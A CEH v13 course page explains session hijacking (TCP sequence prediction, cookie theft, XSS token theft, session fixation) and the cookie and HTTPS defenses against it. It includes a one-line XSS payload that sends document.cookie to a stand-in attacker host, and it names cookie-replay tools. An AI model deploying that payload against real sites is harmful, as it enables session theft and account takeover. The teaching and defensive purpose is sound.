---
title: "CEH v13: Session Hijacking"
date: 2025-01-01
toc: true
draft: false
description: "Master session hijacking for the EC-Council Certified Ethical Hacker (CEH v13) exam. Learn TCP hijacking, cookie theft, session fixation, XSS token theft, and session security defenses."
genre: ["EC-Council CEH Course", "Ethical Hacking", "Penetration Testing", "Offensive Security", "Cybersecurity", "Network Security", "Security Testing", "Hacking Techniques", "CEH Certification", "Information Security"]
tags: ["CEH", "CEH v13", "ethical hacking", "EC-Council", "penetration testing", "session hijacking", "offensive security", "cybersecurity", "hacking", "security testing"]
cover: "/img/cover/ceh-v13-session-hijacking-techniques.webp"
coverAlt: "An illustration of a hacker in a dark workspace, using a laptop. Glowing screens show network connections and abstract data packets with neon blue, green, and purple accents."
coverCaption: "Master Session Hijacking for the CEH v13 Exam"
---

#### [Click Here to Return To the Certified Ethical Hacker (CEH v13) Course Page](/ceh-start/)

**Session Hijacking** takes over authenticated sessions in the **EC-Council CEH v13** course. This module covers network-level and application-level hijacking and the controls that stop it. *Test session attacks only against applications inside your authorized scope.*

Once a user logs in, the server tracks them with a session token. If you steal or predict that token, you act as the user without ever knowing their password.

## Network vs. Application Hijacking

You attack the session at two levels.

| Level | Target | Example |
|-------|--------|---------|
| **Network** | TCP connection | Sequence number prediction |
| **Application** | Web session token | Cookie theft, fixation |

**TCP session hijacking** predicts or guesses sequence numbers to inject packets into an established connection, often after a man-in-the-middle position from the [Sniffing module](/ceh/sniffing/).

## Stealing Web Session Tokens

Web apps store session state in cookies, which makes the cookie the prize.

- **Cookie theft** captures the session cookie over an unencrypted link or through malware.
- **Cross-site scripting (XSS)** runs script in the victim's browser to read and send the token.
- **Session fixation** forces a known session ID on a victim, then reuses it after they log in.

```javascript
// XSS payload that exfiltrates a session cookie
new Image().src = "https://attacker.example/c?" + document.cookie;
```

Tools like **Hamster** and **Ferret** capture and replay session cookies from sniffed traffic.

## Defenses

You protect sessions with cookie hygiene and transport security.

- Set the **HttpOnly** flag so scripts cannot read cookies.
- Set the **Secure** flag so cookies travel only over HTTPS.
- **Regenerate session IDs** after login to defeat fixation.
- **Enforce HTTPS** everywhere and apply short session timeouts.

*Regenerating the session ID at login is the single most effective fix for fixation.*

## Next Steps

Learn to slip past defenses in [Evading IDS, Firewalls, and Honeypots](/ceh/evading-ids-firewalls-honeypots/). Revisit availability attacks in [Denial-of-Service](/ceh/denial-of-service/). Return to the [Certified Ethical Hacker (CEH v13) Course](/ceh-start/).
